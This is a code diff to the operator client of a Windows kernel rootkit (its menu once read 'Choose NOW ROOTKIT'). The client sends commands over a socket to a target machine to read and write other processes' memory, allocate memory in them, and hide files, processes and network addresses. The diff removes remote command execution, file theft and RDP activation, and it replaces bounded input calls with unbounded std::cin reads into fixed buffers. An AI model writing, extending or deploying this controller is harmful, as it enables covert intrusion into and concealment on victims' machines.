@@ -9,23 +9,36 @@ char ProcessorsNum = 8;  // Number of the processors on the machine, might get u
 
 void TripleManipulationInput(int* Object, int* RemoveIndex, const char* ManipulationType, NTSTATUS* RequestStatus) {
 	/*
-	Used to initialize parameters for hiding ports / processes(for now) that have adding, removing and listing attributes
+	Used to initialize parameters for hiding networking / processes(for now) that have adding, removing and listing attributes
 	*/
 	char InputStr[1024] = { 0 };
 	char ReqType = '\0';
 	if (Object != NULL && RemoveIndex != NULL && ManipulationType != NULL && RequestStatus != NULL) {
 		printf("Write type of %s manipulation (r = remove hidden %s, l = list hidden %ses, else = add hidden %s):\n",
 			ManipulationType, ManipulationType, ManipulationType, ManipulationType);
-		scanf_s("%c", &ReqType);
+		std::cin >> ReqType;
 		if (ReqType != 'l') {
-			printf("Write identifier of %s to remove/add:\n", ManipulationType);
-			scanf_s("%s", InputStr);
-			*Object = GeneralUtils::GetNumFromString(InputStr);
-			while (*Object == -1 || *Object == 0 || *Object >= 65535) {
-				GeneralUtils::ResetString(InputStr);
-				printf("Write identifier of %s to remove/add:\n", ManipulationType);
-				scanf_s("%s", InputStr);
+			if (strcmp(ManipulationType, "process") == 0) {
+				printf("Write identifier of process to remove/add:\n");
+				std::cin >> InputStr;
 				*Object = GeneralUtils::GetNumFromString(InputStr);
+				while (*Object == -1 || *Object == 0 || *Object >= 65535) {
+					GeneralUtils::ResetString(InputStr);
+					printf("Write identifier of process to remove/add:\n");
+					std::cin >> InputStr;
+					*Object = GeneralUtils::GetNumFromString(InputStr);
+				}
+			}
+			else {   // For now networking is the only other one
+				printf("[!] Write IP address of the relevant machine:\n");
+				std::cin >> InputStr;
+				if (!IpAddresses::IsValidIp(InputStr)) {
+					printf("[!] Write IP address of the relevant machine:\n");
+					std::cin >> InputStr;
+				}
+
+				// Object actually is char* casted and not int* in this case:
+				RtlCopyMemory(Object, InputStr, strlen(InputStr) + 1);
 			}
 		}
 		switch (ReqType) {
@@ -34,18 +47,18 @@ void TripleManipulationInput(int* Object, int* RemoveIndex, const char* Manipula
 				*RequestStatus = UNHIDE_PROCESS;
 			}
 			else {
-				*RequestStatus = UNHIDE_PORT;  // For now the only other one
+				*RequestStatus = UNHIDE_ADDR;  // For now the only other one
 			}
 			printf("Unhide %s by index in list (I) or by number (else):\n", ManipulationType);
-			scanf_s("%c", &ReqType);
+			std::cin >> ReqType;
 			if (ReqType == 'I') {
 				printf("Write index of %s to remove (make sure to use option l first):\n", ManipulationType);
-				scanf_s("%s", InputStr);
+				std::cin >> InputStr;
 				*RemoveIndex = GeneralUtils::GetNumFromString(InputStr);
 				while (*RemoveIndex == -1) {
 					GeneralUtils::ResetString(InputStr);
 					printf("Write index of %s to remove (make sure to use option l first):\n", ManipulationType);
-					scanf_s("%s", InputStr);
+					std::cin >> InputStr;
 					*RemoveIndex = GeneralUtils::GetNumFromString(InputStr);
 				}
 			}
@@ -56,7 +69,7 @@ void TripleManipulationInput(int* Object, int* RemoveIndex, const char* Manipula
 				*RequestStatus = SHOWHIDDEN_PROCESS;
 			}
 			else {
-				*RequestStatus = SHOWHIDDEN_PORTS;  // For now the only other one
+				*RequestStatus = SHOWHIDDEN_ADDRS;  // For now the only other one
 			}
 			printf("No additional parameters for listing existing dynamically hidden %ses\n", ManipulationType);
 			break;
@@ -65,7 +78,7 @@ void TripleManipulationInput(int* Object, int* RemoveIndex, const char* Manipula
 				*RequestStatus = HIDE_PROCESS;
 			}
 			else {
-				*RequestStatus = HIDE_PORT;  // For now the only other one
+				*RequestStatus = HIDE_ADDR;  // For now the only other one
 			}
 			break;
 		}
@@ -79,9 +92,9 @@ void ValidFilePathInput(char* FilePathBuffer, char* RequestIdentifier) {
 	*/
 	while (FilePathBuffer != NULL && RequestIdentifier != NULL) {
 		printf("Write use of path (g = general name, block all occurences, else = specific path):\n");
-		scanf_s("%c", RequestIdentifier);
+		std::cin >> RequestIdentifier;
 		printf("Write path to hiding file (syntax: \\path\\to\\fileorfolder, to cancel write |||***|||):\n");
-		scanf_s("%s", FilePathBuffer);
+		std::cin >> FilePathBuffer;
 		if (strcmp(FilePathBuffer, "|||***|||") == 0) {
 			GeneralUtils::ResetString(FilePathBuffer);
 			continue;
@@ -89,7 +102,7 @@ void ValidFilePathInput(char* FilePathBuffer, char* RequestIdentifier) {
 		while (!GeneralUtils::ValidateFileReqPath(FilePathBuffer, *RequestIdentifier)) {
 			GeneralUtils::ResetString(FilePathBuffer);
 			printf("Write path to hiding file (syntax: \\path\\to\\fileorfolder, to cancel write |||***|||) ->\n");
-			scanf_s("%s", FilePathBuffer);
+			std::cin >> FilePathBuffer;
 			if (strcmp(FilePathBuffer, "|||***|||") == 0) {
 				GeneralUtils::ResetString(FilePathBuffer);
 				break;
@@ -131,7 +144,7 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 	while (TRUE) {
 
 		// Get type of request to perform:
-		switch (GeneralUtils::ReturnInput("Choose NOW ROOTKIT : \n"
+		switch (GeneralUtils::ReturnInput("Choose operation: \n"
 			"W. Write into process memory\n"
 			"R. Read from process memory\n"
 			"B. Get Module base address\n"
@@ -139,10 +152,7 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 			"A. Allocate specific memory region in a specific process\n"
 			"H. Dynamically hidden files/folders manipulation\n"
 			"P. Dynamically hidden processes manipulation\n"
-			"p. Dynamically hidden port manipulation\n"
-			"G. Get file from target machine\n"
-			"X. Execute CMD command on the target machine\n"
-			"r. Initiate an RDP server on the target machine\n")) {
+			"p. Dynamically hidden networking manipulation\n")) {
 		case 'W': ClientOprStatus = RKOP_WRITE; break;
 
 		case 'R': ClientOprStatus = RKOP_READ; break;
@@ -157,17 +167,11 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 
 		case 'P': ClientOprStatus = RKOP_HIDEPROC; break;
 
-		case 'p': ClientOprStatus = RKOP_HIDEPORT; break;
-
-		case 'G': ClientOprStatus = RKOP_GETFILE; break;
-
-		case 'X': ClientOprStatus = RKOP_EXECOMMAND; break;
-
-		case 'd': ClientOprStatus = RKOP_ACTIVATERDP; break;
+		case 'p': ClientOprStatus = RKOP_HIDEADDR; break;
 
 		default:
 			printf("Quit (press y to accept)?\n");
-			scanf_s("%c", &RequestIdentifier);
+			std::cin >> RequestIdentifier;
 			if (RequestIdentifier == 'y') {
 				closesocket(Sender.AsoSock);
 				return -1;
@@ -206,7 +210,7 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 		CurrentRequestHandled = FALSE;
 		printf("Write main string for the operation (process name, mymyymym to specify medium process, file path, command to execute..):\n");
 		GeneralUtils::ResetString(InputString);
-		scanf_s("%s", InputString);
+		std::cin >> InputString;
 		RtlCopyMemory(MainDescString, InputString, strlen(InputString) + 1);
 		printf("Main string of operation - %s\n", MainDescString);
 
@@ -216,7 +220,7 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 			// Write into process virtual memory, get name of source process:
 			GeneralUtils::ResetString(InputString);
 			printf("Write secondary process name for the operation (relevant process name, mymyymym for medium process or regular for regular buffer passing), no systemspace:\n");
-			scanf_s("%s", InputString);
+			std::cin >> InputString;
 			RtlCopyMemory(SemiDescString, InputString, strlen(InputString) + 1);
 			printf("Secondary request process name - %s\n", SemiDescString);
 
@@ -224,7 +228,7 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 			// Set up the input buffer, operation size and destination address for all cases:
 			if (strcmp(InputString, REGULAR_BUFFER_WRITE) == 0 && UnexpectedErrCode == successful) {
 				printf("Write value to write into memory of target (string for now):\n");
-				scanf_s("%s", InputString);
+				std::cin >> InputString;
 				OperationSize = (ULONG)strlen(InputString) + 1;
 				OperationBuffer = (PVOID)InputString;  // Buffer will not be changed, but will be copied somewhere else
 			}
@@ -306,8 +310,8 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 				"r - Registry\nb - Basic\np - Performance\nt - TimeOfDay\nc - Processes (and threads)\n"
 				"P - Processor Performance\ni - Interrupts (from all processors, array of 8)\n"
 				"e - Exceptions (of all processors, array of 8)\nL - Lookaside\nI - Code Integrity\n");
-			scanf_s("%s", InputString);
-			
+			std::cin >> InputString;
+
 			if (!DriverCalls::GetSystemInfoRootkKMD(InputString, Sender.AsoSock, &SystemInfo, (char*)MainDescString, &ProcessorsNum)) {
 				printf("Get system information did not work\n");
 				break;
@@ -341,12 +345,12 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 				SpecialOprStatus = UNHIDE_FILEFOLDER;
 				GeneralUtils::ResetString(InputString);
 				printf("Write index of file to remove (make sure to use option l first):\n");
-				scanf_s("%s", InputString);
+				std::cin >> InputString;
 				RemoveIndex = GeneralUtils::GetNumFromString(InputString);
 				while (RemoveIndex == -1) {
 					GeneralUtils::ResetString(InputString);
 					printf("Write index of file to remove (make sure to use option l first):\n");
-					scanf_s("%s", InputString);
+					std::cin >> InputString;
 					RemoveIndex = GeneralUtils::GetNumFromString(InputString);
 				}
 				break;
@@ -394,56 +398,20 @@ int ClientOperation(NETWORK_INFO Sender, NETWORK_INFO Server) {
 			SpecialOprStatus = STATUS_UNSUCCESSFUL;
 			break;
 
-		case RKOP_HIDEPORT:
+		case RKOP_HIDEADDR:
 
-			// Request for hiding ports, get type of port manipulation:
-			TripleManipulationInput(&RemoveIdentifier, &RemoveIndex, "port", &SpecialOprStatus);
-			OperationResult = DriverCalls::HidePortConnectionRootkKMD((char*)MainDescString, RemoveIdentifier, RemoveIndex, Sender.AsoSock, SpecialOprStatus);
+			// Request for hiding ports, get type of networking manipulation:
+			TripleManipulationInput((int*)InputString, &RemoveIndex, "networking", &SpecialOprStatus);
+			OperationResult = DriverCalls::HideNetworkingRootkKMD((char*)MainDescString, InputString, RemoveIndex, Sender.AsoSock, SpecialOprStatus);
 			if (OperationResult) {
-				printf("Ports manipulation succeeded!\n");
+				printf("Networking manipulation succeeded!\n");
 			}
 			else {
-				printf("Ports manipulation did not succeed\n");
+				printf("Networking manipulation did not succeed\n");
 			}
 			RemoveIndex = -1;
 			OperationResult = FALSE;
 			SpecialOprStatus = STATUS_UNSUCCESSFUL;
-			break;
-
-		case RKOP_GETFILE:
-
-			// Get file from target machine:
-			OperationResult = GeneralRequests::DownloadFileRequest((char*)MainDescString, Sender.AsoSock);
-			if (!OperationResult) {
-				printf("Failed operation - %d\n", GetLastError());
-			}
-			else {
-				printf("Operation succeeded\n");
-			}
-			break;
-
-		case RKOP_EXECOMMAND:
-
-			// Execute cmd command:
-			OperationResult = GeneralRequests::RemoteCommandRequest((char*)MainDescString, Sender.AsoSock);
-			if (!OperationResult) {
-				printf("Failed operation - %d\n", GetLastError());
-			}
-			else {
-				printf("Operation succeeded\n");
-			}
-			break;
-
-		case RKOP_ACTIVATERDP:
-
-			// Activate RDP service:
-			OperationResult = GeneralRequests::ActivateRDPRequest(Sender.AsoSock, (char*)MainDescString);
-			if (!OperationResult) {
-				printf("Failed operation - %d\n", GetLastError());
-			}
-			else {
-				printf("Operation succeeded\n");
-			}
 			break;
 		}
 		ClientOprStatus = RKOP_NOOPERATION;
